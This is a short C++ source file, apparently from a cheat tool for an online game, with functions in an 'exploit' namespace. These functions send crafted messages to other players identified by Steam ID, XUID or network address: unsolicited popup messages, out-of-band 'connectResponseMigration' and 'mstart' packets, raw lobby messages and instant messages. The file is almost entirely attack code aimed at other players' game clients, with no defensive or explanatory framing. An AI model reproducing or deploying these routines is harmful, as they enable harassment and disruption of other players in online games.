#include "exploits.h"

namespace exploit
{

	void send_popup(const std::uint64_t target_steam_id)
	{
		if (Live_IsDemonwareFetchingDone(0))
		{
			const JoinSessionMessage message{ JOIN_REPLY };
			dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, 0);
		}
	}


	void send_connect_response_migration_packet(const netadr_t& to)
	{
		if (Live_IsDemonwareFetchingDone(0))
			send_oob(to, "connectResponseMigration");
	}

	void send_mstart_packet(const netadr_t& to)
	{
		if (Live_IsDemonwareFetchingDone(0))
			send_oob(to, "mstart");
	}

	void SendToAdr(__int64 XUID, const netadr_t& to)
	{
		char lobbyMsgOOB[0x20000]{};
		LobbyMsg lm{};
		LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20000, (MsgType)2);
		LobbyMsgTransport_SendToAdr(0, 11, LobbyModule::LOBBY_MODULE_CLIENT, to, XUID, (msg_t*)&lm, (MsgType)2);
	}

	void send_IM(const std::uint64_t target_xuid, std::uint32_t msg, std::uint32_t MESSAGE, unsigned int MSG_SIZE)
	{
		if (!Live_IsDemonwareFetchingDone(0))
			return;

		const JoinSessionMessage message{ JOIN_REQUEST };
		dwInstantSendMessage(0, &target_xuid, 1, msg, &MESSAGE, MSG_SIZE);
	}
}